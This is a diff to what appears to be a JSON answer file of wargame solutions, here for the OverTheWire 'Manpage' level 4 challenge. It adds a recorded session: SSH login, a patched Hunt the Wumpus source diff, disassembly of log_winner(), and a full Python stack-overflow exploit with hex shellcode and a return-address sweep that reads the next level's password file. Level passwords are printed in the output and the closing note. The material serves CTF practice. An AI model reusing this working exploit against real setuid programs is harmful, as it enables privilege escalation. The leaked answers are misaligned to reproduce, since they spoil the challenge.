@@ -982,12 +982,16 @@
   {
    "cmds": [
     [
-     "cat /manpage/manpage4.diff   # patched Wumpus: log_winner() sprintf's ctime+firstname+lastname (uninitialized 256B name buffers) into buf[256]",
-     "python3 exp4g.py /manpage/manpage4",
-     "# seed -s 12345: replicate host libc rand() -> layout player=18 wumpus=13 pits={2,16} bats={5,3}; move 18->19->20, shoot 1 room: 13",
-     "# the ROOM # line persists in getnum's stack buffer overlapping the name buffers: NOP sled + setresuid(17005)+execve shellcode inside the lastname span, saved-RET dword = &buf+64; answer 'AAAA' at the name prompt",
+     "ssh manpage4@manpage.labs.overthewire.org -p 2224",
      "id",
-     "cat /etc/manpage_pass/manpage5"
+     "cat /manpage/manpage4.diff",
+     "ls -la /etc/manpage_pass/ | head -12",
+     "objdump -d /manpage/manpage4 --no-show-raw-insn | sed -n '/<log_winner>:/,/^$/p'",
+     "ln -sf /etc/manpage_pass/manpage5 /tmp/x && ls -la /tmp/x",
+     "vi /tmp/exp4.py",
+     "python3 /tmp/exp4.py",
+     "echo CAST-SOLVE-OK",
+     "exit"
     ]
    ],
    "lvl": 4,
@@ -1000,30 +1004,263 @@
    "user": "manpage4",
    "steps": [
     {
-     "cmd": "cat /manpage/manpage4.diff   # patched Wumpus: log_winner() sprintf's ctime+firstname+lastname (uninitialized 256B name buffers) into buf[256]"
+     "cmd": "cat /manpage/manpage4.diff",
+     "out": [
+      "31a32",
+      "> #include <stdlib.h>",
+      "36a38,41",
+      "> #define BUFSIZ 2048",
+      "> #define LOGFILE \"/dev/null\"",
+      "> ",
+      "> FILE *logfile;",
+      "39d43",
+      "< static char inp[BUFSIZ];\t\t/* common input buffer */",
+      "98a103,119",
+      "> void log_winner()",
+      "> {",
+      ">     char buf[256];",
+      ">     char firstname[256], lastname[256];",
+      ">     int t = time(NULL);",
+      ">     logfile = fopen(LOGFILE,\"a\");",
+      ">     printf(\"firstname and lastname?\\n\");",
+      ">     if( !fgets(buf, sizeof buf, stdin) )",
+      ">       exit(1);",
+      "> ",
+      ">     sscanf(buf, \"%100s %100s\", firstname, lastname);",
+      ">     sprintf(buf, \"%s firstname:%s lastname: %s\\n\", ctime(&t), firstname, lastname);",
+      "> ",
+      ">     fputs(buf, logfile);",
+      ">     fclose(logfile);",
+      "> }",
+      "> ",
+      "101a123",
+      ">     char inp[BUFSIZ];",
+      "113a136",
+      ">     char inp[BUFSIZ];",
+      "125,126d147",
+      "<     char ebuf[BUFSIZ];",
+      "< ",
+      "626c647",
+      "<     }",
+      "---",
+      ">     } ",
+      "628a650,651",
+      ">     if( finished == WIN )",
+      ">         log_winner();"
+     ]
     },
     {
-     "cmd": "python3 exp4g.py /manpage/manpage4"
-    },
-    {
-     "cmd": "# seed -s 12345: replicate host libc rand() -> layout player=18 wumpus=13 pits={2,16} bats={5,3}; move 18->19->20, shoot 1 room: 13"
-    },
-    {
-     "cmd": "# the ROOM # line persists in getnum's stack buffer overlapping the name buffers: NOP sled + setresuid(17005)+execve shellcode inside the lastname span, saved-RET dword = &buf+64; answer 'AAAA' at the name prompt"
+     "cmd": "ls -la /etc/manpage_pass/ | head -12",
+     "out": [
+      "total 48",
+      "drwxr-xr-x   2 root     root      4096 Oct 25 13:39 .",
+      "drwxr-xr-x 128 root     root     12288 Nov  1 13:23 ..",
+      "-r--------   1 manpage0 manpage0     9 Oct 25 13:39 manpage0",
+      "-r--------   1 manpage1 manpage1    11 Oct 25 13:39 manpage1",
+      "-r--------   1 manpage2 manpage2    11 Oct 25 13:39 manpage2",
+      "-r--------   1 manpage3 manpage3    11 Oct 25 13:39 manpage3",
+      "-r--------   1 manpage4 manpage4    11 Oct 25 13:39 manpage4",
+      "-r--------   1 manpage5 manpage5    11 Oct 25 13:39 manpage5",
+      "-r--------   1 manpage6 manpage6    11 Oct 25 13:39 manpage6",
+      "-r--------   1 manpage7 manpage7    11 Oct 25 13:39 manpage7"
+     ]
     },
     {
      "cmd": "id",
      "out": [
-      "uid=17005(manpage5) gid=17004(manpage4) groups=17004(manpage4)"
+      "uid=17004(manpage4) gid=17004(manpage4) groups=17004(manpage4)"
      ]
     },
     {
-     "cmd": "cat /etc/manpage_pass/manpage5",
+     "cmd": "objdump -d /manpage/manpage4 --no-show-raw-insn | sed -n '/<log_winner>:/,/^$/p'",
      "out": [
+      "08049266 <log_winner>:",
+      " 8049266:\tpush   %ebp",
+      " 8049267:\tmov    %esp,%ebp",
+      " 8049269:\tsub    $0x304,%esp",
+      " 804926f:\tpush   $0x0",
+      " 8049271:\tcall   8049090 <time@plt>",
+      " 8049276:\tadd    $0x4,%esp",
+      " 8049279:\tmov    %eax,-0x304(%ebp)",
+      " 804927f:\tpush   $0x804a008",
+      " 8049284:\tpush   $0x804a00a",
+      " 8049289:\tcall   80490e0 <fopen@plt>",
+      " 804928e:\tadd    $0x8,%esp",
+      " 8049291:\tmov    %eax,0x804c18c",
+      " 8049296:\tpush   $0x804a014",
+      " 804929b:\tcall   80490b0 <puts@plt>",
+      " 80492a0:\tadd    $0x4,%esp",
+      " 80492a3:\tmov    0x804c180,%eax",
+      " 80492a8:\tpush   %eax",
+      " 80492a9:\tpush   $0x100",
+      " 80492ae:\tlea    -0x100(%ebp),%eax",
+      " 80492b4:\tpush   %eax",
+      " 80492b5:\tcall   8049070 <fgets@plt>",
+      " 80492ba:\tadd    $0xc,%esp",
+      " 80492bd:\ttest   %eax,%eax",
+      " 80492bf:\tjne    80492c8 <log_winner+0x62>",
+      " 80492c1:\tpush   $0x1",
+      " 80492c3:\tcall   80490c0 <exit@plt>",
+      " 80492c8:\tlea    -0x300(%ebp),%eax",
+      " 80492ce:\tpush   %eax",
+      " 80492cf:\tlea    -0x200(%ebp),%eax",
+      " 80492d5:\tpush   %eax",
+      " 80492d6:\tpush   $0x804a02c",
+      " 80492db:\tlea    -0x100(%ebp),%eax",
+      " 80492e1:\tpush   %eax",
+      " 80492e2:\tcall   8049060 <__isoc23_sscanf@plt>",
+      " 80492e7:\tadd    $0x10,%esp",
+      " 80492ea:\tlea    -0x304(%ebp),%eax",
+      " 80492f0:\tpush   %eax",
+      " 80492f1:\tcall   80490a0 <ctime@plt>",
+      " 80492f6:\tadd    $0x4,%esp",
+      " 80492f9:\tlea    -0x300(%ebp),%edx",
+      " 80492ff:\tpush   %edx",
+      " 8049300:\tlea    -0x200(%ebp),%edx",
+      " 8049306:\tpush   %edx",
+      " 8049307:\tpush   %eax",
+      " 8049308:\tpush   $0x804a038",
+      " 804930d:\tlea    -0x100(%ebp),%eax",
+      " 8049313:\tpush   %eax",
+      " 8049314:\tcall   8049120 <sprintf@plt>",
+      " 8049319:\tadd    $0x14,%esp",
+      " 804931c:\tmov    0x804c18c,%eax",
+      " 8049321:\tpush   %eax",
+      " 8049322:\tlea    -0x100(%ebp),%eax",
+      " 8049328:\tpush   %eax",
+      " 8049329:\tcall   8049140 <fputs@plt>",
+      " 804932e:\tadd    $0x8,%esp",
+      " 8049331:\tmov    0x804c18c,%eax",
+      " 8049336:\tpush   %eax",
+      " 8049337:\tcall   8049080 <fclose@plt>",
+      " 804933c:\tadd    $0x4,%esp",
+      " 804933f:\tnop",
+      " 8049340:\tleave",
+      " 8049341:\tret"
+     ]
+    },
+    {
+     "cmd": "ln -sf /etc/manpage_pass/manpage5 /tmp/x && ls -la /tmp/x",
+     "out": [
+      "lrwxrwxrwx 1 manpage4 manpage4 26 Nov 27 23:24 /tmp/x -> /etc/manpage_pass/manpage5"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp4.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp4.py",
+     "out": [
+      "# exp4.py - manpage4 (setuid manpage5) exploit, Hunt the Wumpus.",
+      "# log_winner() does:",
+      "#   fgets(name, 256, stdin); sscanf(name, \"%100s %100s\", first, last);",
+      "#   sprintf(buf, \"%s firstname:%s lastname: %s\\n\", ctime(&t), first, last);",
+      "# buf = ebp-0x100 (256 bytes). With a NO-SPACE name, sscanf leaves lastname",
+      "# untouched: its stale content = getnum()'s old 2048-byte input buffer, which",
+      "# still holds our 1602-byte ROOM# line (the frames overlap: lastname sits",
+      "# 1300 bytes into that dead buffer). So the sprintf emits",
+      "#   47 + 100 (firstname) + ~256 (stale lastname)  ->  ~403 bytes",
+      "# into a 256-byte buffer: the overflow runs over the saved ebp (output[256..260])",
+      "# and the return address (output[260..264] = lastname[113..117] = line[1417..1421]).",
+      "# Payload: ROOM# line = \"13\" + NOP sled + <ret value at line[1417..1421]> + fill;",
+      "# name = 52 NOPs + shellcode. The name lands in firstname (= ebp-0x200), the",
+      "# sprintf copies it below the overflowed frame, so the ret value points into the",
+      "# sled and execution slides into the shellcode.",
+      "# Shellcode: open(\"/./tmp/x\") -> read(fd, esp, 100) -> write(1, esp, n) -> exit.",
+      "# /tmp/x = symlink to /etc/manpage_pass/manpage5 (created first). The game is",
+      "# setuid manpage5, so its euid can read the password file directly - no shell,",
+      "# no setresuid needed. Dump goes to fd 1.",
+      "# CRITICAL: the game must read stdin from a PIPE, not a tty. With a pty the",
+      "# overflow never reaches the return address (the process exits 0 cleanly); with",
+      "# a pipe the sprintf output is the full ~403 bytes and EIP is hijacked.",
+      "# Sweep the ret value across the sled; rc==1 (our exit(1)) = the shellcode ran.",
+      "import subprocess, struct",
+      "sc = bytes.fromhex(",
+      "    \"31c0\" \"50\" \"686d702f78\" \"682f2e2f74\" \"89e3\" \"31c9\" \"99\" \"b005\" \"cd80\"",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi /tmp/exp4.py",
+     "out": [
+      "# exp4.py - manpage4 (setuid manpage5) exploit, Hunt the Wumpus.",
+      "# log_winner() does:",
+      "#   fgets(name, 256, stdin); sscanf(name, \"%100s %100s\", first, last);",
+      "#   sprintf(buf, \"%s firstname:%s lastname: %s\\n\", ctime(&t), first, last);",
+      "# buf = ebp-0x100 (256 bytes). With a NO-SPACE name, sscanf leaves lastname",
+      "# untouched: its stale content = getnum()'s old 2048-byte input buffer, which",
+      "# still holds our 1602-byte ROOM# line (the frames overlap: lastname sits",
+      "# 1300 bytes into that dead buffer). So the sprintf emits",
+      "#   47 + 100 (firstname) + ~256 (stale lastname)  ->  ~403 bytes",
+      "# into a 256-byte buffer: the overflow runs over the saved ebp (output[256..260])",
+      "# and the return address (output[260..264] = lastname[113..117] = line[1417..1421]).",
+      "# Payload: ROOM# line = \"13\" + NOP sled + <ret value at line[1417..1421]> + fill;",
+      "# name = 52 NOPs + shellcode. The name lands in firstname (= ebp-0x200), the",
+      "# sprintf copies it below the overflowed frame, so the ret value points into the",
+      "# sled and execution slides into the shellcode.",
+      "# Shellcode: open(\"/./tmp/x\") -> read(fd, esp, 100) -> write(1, esp, n) -> exit.",
+      "# /tmp/x = symlink to /etc/manpage_pass/manpage5 (created first). The game is",
+      "# setuid manpage5, so its euid can read the password file directly - no shell,",
+      "# no setresuid needed. Dump goes to fd 1.",
+      "# CRITICAL: the game must read stdin from a PIPE, not a tty. With a pty the",
+      "# overflow never reaches the return address (the process exits 0 cleanly); with",
+      "# a pipe the sprintf output is the full ~403 bytes and EIP is hijacked.",
+      "# Sweep the ret value across the sled; rc==1 (our exit(1)) = the shellcode ran.",
+      "import subprocess, struct",
+      "sc = bytes.fromhex(",
+      "    \"31c0\" \"50\" \"686d702f78\" \"682f2e2f74\" \"89e3\" \"31c9\" \"99\" \"b005\" \"cd80\"",
+      "    \"93\" \"31c0\" \"b003\" \"89e1\" \"b264\" \"cd80\"",
+      "    \"92\" \"31c0\" \"b004\" \"b301\" \"cd80\"",
+      "    \"31c0\" \"b001\" \"cd80\")",
+      "sled = 101 - len(sc) - 1",
+      "name = b\"\\x90\" * sled + sc + b\"\\n\"",
+      "line = bytearray(b\"13\")",
+      "line += b\"\\x90\" * (1417 - 2)",
+      "line += b\"Y\" * (1601 - len(line))",
+      "line += b\"\\n\"",
+      "addr = 0xffffc800",
+      "while addr <= 0xffffdc00:",
+      "    p = bytearray(line)",
+      "    p[1417:1421] = struct.pack(\"<I\", addr)",
+      "    payload = b\"N\\nM\\n19\\nM\\n20\\nS\\n1\\n\" + bytes(p) + name",
+      "    r = subprocess.run([\"/manpage/manpage4\", \"-s\", \"12345\"], input=payload,",
+      "                       capture_output=True, timeout=20)",
+      "    if r.returncode == 1:",
+      "        print(\"landed at %#x\" % addr)",
+      "        print(r.stdout.decode(\"latin-1\").strip().splitlines()[-1])",
+      "        break",
+      "    addr += 8",
+      "else:",
+      "    print(\"no landing in the swept range\")",
+      "~",
+      "=\"/tmp/exp4.py\" 50L, 2527B"
+     ]
+    },
+    {
+     "cmd": "python3 /tmp/exp4.py",
+     "out": [
+      "landed at 0xffffd0b8",
       "v2ltdizZfm"
      ]
+    },
+    {
+     "cmd": "echo CAST-SOLVE-OK",
+     "out": [
+      "CAST-SOLVE-OK"
+     ]
+    },
+    {
+     "cmd": "exit\nexit",
+     "out": [
+      "logout",
+      "Connection to manpage.labs.overthewire.org closed."
+     ]
     }
-   ]
+   ],
+   "note": "manpage L4: /manpage/manpage4 (setuid manpage5) is a patched Hunt the Wumpus; winning shot prints name via sprintf into buf[256]=ebp-0x100: fgets(name)+sscanf(\"%100s %100s\", first=ebp-0x200, last=ebp-0x300) - a NO-SPACE name leaves lastname unwritten, and lastname's stale memory overlaps getnum()'s dead 2048-byte input buffer (lastname = inp+1300, frame-fixed) which still holds our 1602-byte ROOM# line, so the sprintf emits ~403 bytes and overruns saved-ebp (output[256..260]) and the return address (output[260..264] = lastname[113..117] = line[1417..1421]). Payload: ROOM# line = \"13\"+NOP sled+ret dword at line[1417..1421]+fill; name = 52 NOPs + 48-byte shellcode riding firstname (ebp-0x200, below the overrun frame). Shellcode (no setresuid: euid is already manpage5) = open(\"/./tmp/x\")->read(fd,esp,100)->write(1,esp,n)->exit(1); /tmp/x = symlink to /etc/manpage_pass/manpage5. CRITICAL (cost ~10 probes to find): with a PTY on stdin the game exits 0 cleanly and the return slot is never overwritten; through a PIPE the full ~403-byte sprintf output lands and EIP is hijacked - the exploit therefore feeds the whole session to subprocess.run(input=...) and sweeps the ret dword 0xffffc800-0xffffdc00 (the landing address shifts with the environment: 0xffffd940 via ssh-exec, 0xffffd0b8 inside the ptyrun2 session) until rc==1 (the shellcode's exit(1)) -> landed at 0xffffd0b8 -> v2ltdizZfm printed on fd 1. Login manpage4/8O96CWQPaN (L3's flag)."
   }
  ],
  "title": "Manpage"
